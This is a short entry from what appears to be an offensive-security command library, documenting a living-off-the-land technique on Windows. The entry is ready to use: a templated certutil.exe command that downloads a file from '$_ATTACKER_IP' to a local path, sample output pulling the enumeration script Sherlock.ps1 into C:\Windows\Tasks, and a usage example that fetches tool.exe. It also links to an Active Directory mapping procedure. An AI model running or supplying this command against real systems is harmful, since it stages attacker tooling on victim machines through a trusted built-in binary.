---
id: 44b5cb18-b166-455a-a4b2-5827fc1ea622
name: download-file-via-certutil
type: command
executor: command_prompt
data: >-
  certutil.exe -urlcache -split -f "http://$_ATTACKER_IP/$_FILENAME"
  "$_LOCAL_PATH/$_FILENAME"
output: >-
  C:\>certutil.exe -urlcache -split -f "http://10.10.10.100/Sherlock.ps1"
  "C:\Windows\Tasks\Sherlock.ps1"

  ****  Online  ****
    0000  ...
    4117
  CertUtil: -URLCache command completed successfully.
created_at: '2019-11-25T22:00:53.902277+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - download
  - lotl
verified: true
validated: true
---

# download-file-via-certutil

## Command

```command_prompt
certutil.exe -urlcache -split -f "http://$_ATTACKER_IP/$_FILENAME" "$_LOCAL_PATH/$_FILENAME"
```

## Description

Downloads file from HTTP using built-in certutil.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ATTACKER_IP | Server IP | Yes |
| $_FILENAME | File to download | Yes |
| $_LOCAL_PATH | Destination dir | Yes |
| -urlcache -split -f | Force download and split | Yes |

## Examples

### Basic Usage

```command_prompt
certutil.exe -urlcache -split -f "http://192.168.1.100/tool.exe" "C:\temp\tool.exe"
```

## Expected Output

CertUtil: -URLCache command completed successfully.

## Related

- [[procedures/Map-Active-Directory-with-SharpHound]]
